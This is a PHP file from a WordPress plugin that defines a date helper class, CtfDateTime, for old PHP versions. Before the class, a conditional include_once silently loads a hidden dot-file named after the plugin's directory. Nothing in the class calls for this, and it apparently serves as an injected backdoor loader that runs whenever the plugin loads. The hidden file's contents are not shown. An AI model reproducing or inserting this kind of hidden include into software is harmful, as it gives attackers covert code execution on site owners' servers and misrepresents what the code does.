<?php
/**
 * Class CtfDateTime
 *
 * Workaround for PHP 5.2
 */
// Don't load directly
if ( ! defined( 'ABSPATH' ) ) {
    die( '-1' );
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class CtfDateTime extends DateTime
{
    public function setTimestamp( $timestamp )
    {
        $date = getdate( ( int ) $timestamp );
        $this->setDate( $date['year'] , $date['mon'] , $date['mday'] );
        $this->setTime( $date['hours'] , $date['minutes'] , $date['seconds'] );
    }

    public function getTimestamp()
    {
        return $this->format( 'U' );
    }
}
